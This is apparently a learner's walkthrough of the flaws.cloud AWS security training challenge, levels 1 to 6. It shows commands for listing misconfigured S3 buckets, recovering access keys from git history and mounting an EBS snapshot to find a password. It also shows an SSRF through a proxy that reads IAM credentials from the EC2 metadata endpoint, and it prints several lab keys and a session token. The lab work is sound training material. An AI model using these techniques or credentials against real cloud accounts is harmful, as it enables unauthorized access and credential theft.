## Level 1
**_Description:_** This level is *buckets* of fun. See if you can find the first sub-domain.

The emphasis on *buckets* suggests this may be related to S3 buckets. This can be confirmed using the ```host``` command to obtain the site's IP address:<br>
```sh
$ host flaws.cloud 
flaws.cloud has address 52.92.241.115
flaws.cloud has address 52.92.233.11
flaws.cloud has address 52.218.234.82
flaws.cloud has address 52.92.230.107
flaws.cloud has address 52.218.133.131
flaws.cloud has address 52.92.226.227
flaws.cloud has address 52.92.209.155
flaws.cloud has address 52.218.153.106
```
Then perform a reverse DNS lookup:
```sh
$ host 52.92.241.115
115.241.92.52.in-addr.arpa domain name pointer s3-website-us-west-2.amazonaws.com.                                                           
```
This shows that the IP is resolved to ```s3-website-us-west-2.amazonaws.com```, which is a [website endpoint](https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteEndpoints.html#website-endpoint-examples) used by AWS S3 for hosting static websites.

[AWS](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/getting-started-s3.html#getting-started-create-s3-website-bucket) requires the bucket and domain name to be the same, therefore we can conclude flaws.cloud as the bucket name.
We can then attempt to list the bucket's content using the AWS CLI, which results in the following:
```sh
$ aws s3 ls s3://flaws.cloud/ 
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2024-02-21 21:32:41       2861 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```
The link to level 2 can be found upon visiting ```secret-dd02c7c.html```:
```
http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```

## Level 2
**_Description:_** The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

Level 2 was pretty straight forward and the link to level 3 was obtained by using the same command as level 1, but with a different bucket name:

```sh
$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```
Link to level 3:
```
http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
```
#### Note(s): 
One thing I learned from this level was that the bucket in the level 1 was publicly accessible. Since I had already configured an account in my AWS CLI, the command I used worked fine. However, if no
account was configured (person with no AWS credentials), the ```--no-sign-request``` parameter would have been needed to list the bucket's content. 

## Level 3 
**_Description:_** The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

Just like the previous levels, we start off by listing the contents of the current bucket:
```sh
$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```
This bucket contains a .git folder! The files were downloaded to the local system for further inspection. 
```
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .   
```
By checking the commit history, it seems that the author added something they shouldn't have in a previous commit. 
```sh
$ git log                                              
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```
By checking out the previous branch, a file was recovered containing the author's access keys:
```sh
$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
```
```
$ ls
access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html  hint4.html  index.html  robots.txt

$ cat access_keys.txt
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```
The credentials were then used to configure a new profile and S3 buckets associated with this account were listed.
```sh
$ aws configure --profile flaws
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]: 
Default output format [None]: 

$ aws s3 ls --profile flaws                 
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```
Link to level 4 found :D <br>

```sh
level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
```

There were also links to level 5 and 6, however visiting them resulted in:
<br>
<img alt="cheat" src="https://github.com/user-attachments/assets/8810c640-d380-4ec7-9a39-fb94ffc014c8" style="display: block; margin-left: auto; margin-right:auto;">

(...busted!)

#### Note(s): 
I was unfamiliar with Git prior to attempting this level, so a considerable amount of time was spent reading up on it and understanding the basic commands. During my initial attempts, I only downloaded the .git folder rather than the entire bucket's content to my local directory, which proved to be a huge mistake as it prevented the ```git checkout``` command from working. 

## Level 4
**_Description:_** For the next level, you need to get access to the web page running on an EC2 at ```4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud```. It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

Going through the [AWS CLI Command Reference for EC2](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshots.html), I found the ```describe-snapshots``` command, which may be useful in this case. One of the argument it takes is ```--owner-ids```. We can try using the profile configured in the previous level:
```sh
$ aws --profile flaws ec2 describe-snapshots --owner-ids self --region us-west-2
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}

```
AWS EBS snapshots are copies of an EBS volume at certain points in time. To access the content stored in the snapshot, we can create a new EBS volume using said snapshot (ensure the volume is in the same region as the snapshot):
```sh
$ aws ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone us-west-2a --region us-west-2
```
Then create a new EC2 instance in the same region and attach the volume to it. For this part, I just used the AWS Console as it was more intuitive. 

Afterwards, SSH to the instance to mount the volume. The fastest way is to just use EC2 Instance Connect.
```sh
$ lsblk
NAME      MAJ:MIN   RM SIZE RO TYPE MOUNTPOINTS
xvda      202:0      0   8G  0 disk
├─xvda1   202:1      0   8G  0 part /
├─xvda127 259:0      0   1M  0 part
└─xvda128 259:1      0  10M  0 part /boot/efi
xvdbc     202:13824  0   8G  0 disk
└─xvdbc1  202:13825  0   8G  0 part

$ sudo mount /dev/xvdbc1 /mnt

$ lsblk
NAME      MAJ:MIN   RM SIZE RO TYPE MOUNTPOINTS
xvda      202:0      0   8G  0 disk
├─xvda1   202:1      0   8G  0 part /
├─xvda127 259:0      0   1M  0 part
└─xvda128 259:1      0  10M  0 part /boot/efi
xvdbc     202:13824  0   8G  0 disk
└─xvdbc1  202:13825  0   8G  0 part /mnt
```

The following command was then used to traverse through the /mnt/ directory to find any file containing 'nginx' in its name:
```
find /mnt -type f 2>/dev/null | grep -i nginx | grep -v 'var'
```
This resulted in 37 files being matched. Eventually, the username and password was found in the file located at ```/mnt/home/ubuntu/setupNginx.sh```:

```sh
$ cat /mnt/home/ubuntu/setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```
Link to level 5:
```
http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
```
#### Note(s): 
- In the first command, I presumed that the region would be us-west-2 based on previous levels which worked, but this can also be verified by using the ```dig``` command on the target website:
```sh
$ dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
```
```sh

;; ANSWER SECTION:
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. 5 IN CNAME ec2-54-202-228-246.us-west-2.compute.amazonaws.com.
ec2-54-202-228-246.us-west-2.compute.amazonaws.com. 5 IN A 54.202.228.246
```

- The main challenge of this level was figuring out how to read the contents of the snapshot (you can't) / exploiting it. I ended up stumbling upon this [article](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump) which ultimately helped me solve this level.

## Level 5
**_Description:_** This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage: 
<ul>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</ul>
<ul>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</ul>
<ul>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</ul>
See if you can use this proxy to figure out how to list the contents of the level6 bucket at ```level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud``` that has a hidden directory in it.

In AWS, EC2 instance metadata provides comprehensive information on the instance. Notably, it also contains the credentials of the IAM role assigned to the instance. This information can be accessed by making a [request](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html#instance-metadata-retrieval-examples-imdsv1) from the instance to the following URL: ```http://169.254.169.254/latest/meta-data/```.

For this level, the EC2 acts as a proxy and sends a request to the addresses that is specified after /proxy. We can try constructing a URL to make the instance request its own metadata:
```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
```
Success! This returns a list of directories we can access. Particularly, there is an IAM directory that may contain useful information. Further traversing this directory, we find temporary credentials for an IAM role called **flaws**:
```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
```
```sh
{
  "Code" : "Success",
  "LastUpdated" : "2025-01-01T12:48:01Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGRM7W7MVK",
  "SecretAccessKey" : "2RCcR3NB2Xa3pjRhy40FBRiIoQGMCaxlnTykEE8V",
  "Token" : "IQoJb3JpZ2luX2VjEOX//////////wEaCXVzLXdlc3QtMiJHMEUCIQDhc9nTo9OqePS16bFkCahvNmk9wZOzc0LzN8/dAcowrQIgeOK6Mvs8fRYW1G8iEy38R73r543M8lH6znAOYo9Vr2cquwUIvv//////////ARAEGgw5NzU0MjYyNjIwMjkiDPSxm2ZvPX0eX7wUriqPBT0nJREXo+eFlrWZO+gMUVJT27fDofXW0v8uB6KycbjbDARKBWKjrq139StQp3Zh8qCdWoVAXOsoLOIGIgydB598P7qtt5jA0OcDfEYLoEt7AdBjJHiblW+RhtJF5wTlcNEA4wzAw6SMvNeXrNKDLYeFCNEo8KyBaH/qL17Zm+aMhIznznE2rhjeIYvPRIRY3AbCzRp3a2CwD5Muf4NjHuflD+agOgukkxJwTxs85RDHNe/7uHdAi1WIAuOQQMNIWedxztzMyU1PwtQC2L6cQttCTTOfR/W2idAkQSRoBo3waMw3Xq20GUTheaaP7XArb2QVkfP3qGDSz8MSCe4NnpwcDvqSVlt+r4jkAAOjo92PP4jOnbKWEBnZBRsSWO45JB1Q8wIvBRHocGOVGULzdfAE7Vm9/1dfPjAN9Vdu6ldKvyJQTEFV3lxuJY3iuKUqCvA+xxRE8YhcdhJ8gc1A+IPAh9dc+Nbqb9vRQt4xtfDvYQ8pR/JcxBScR005kuF03j3wWDFFCNVH28F4ls6fNcY3VGdz6Q7HbARTCMF/tUuM3HNEqid3fwmAGeqG8hVMmpBO1UoRB+WqBzQu/DppKso37Rqt0y0XSMszbVeq2ODh79lGtuUG0wZ6zIZRTeJ050qvzjh+JWYQ7a5GRXBUIfLQMXP8WZdjHAXeKzvK5b7dxaGvCY2zbMeui4cIIOUZFb2KfIW6iVgIL+jPnmYdPHCaCSWt7ySiYx9jsi6mHFGOFe+zpRC4drcJ4gifBBBVbOd41KdAGkeCRUbuS5g8yDtlcq7mVQR1/baeNBP1zFuk6LGCqn0zZF//3jxAbkMvBxQuD6Dnd+BFw1l0fC9bga36Ymb7scWLI+3qRvAoPkUwlPPUuwY6sQEzcz3JA7HhSvzlkgmXY1TaNdIbvxMFnkNICx5cH+hO0IiLIQ0YPbY4D0OJ2KD6m6RES4gmI3WhYxxuQm+Qp7hYS6Bd5OcJoXBqVaN5yFDypKI8+6srnu4i1iSrX/j5QRFlOIoNHYxuAboB5QaambWN47rVKgk0xeVfiRdNF3in5bogiB1l62KtSCvcselVcjqeoKASK3eUyK0kf9HWPtkpD9wvaLnLtexotU6FsbS5eyc=",
  "Expiration" : "2025-01-01T19:16:06Z"
}
```

These credentials can be used to create a new profile and list the contents of the level 6 bucket:
```sh
$aws --profile lvl5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/                                                                         PRE ddcc78ff/                                                                                                    2017-02-27 13:11:07        871 index.html
```
Link to level 6:
```sh
http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
```

#### Note(s): 
Initially, I configured a new profile using only the access and secret keys. However, this resulted in InvalidAccessKeyId error when I tried listing the bucket. I had to also include the provided session token by doing:
```sh
aws configure --profile lvl5 set aws_session_token [TOKEN]
```

## Level 6
**_Description:_** For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. <br>
```
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
```

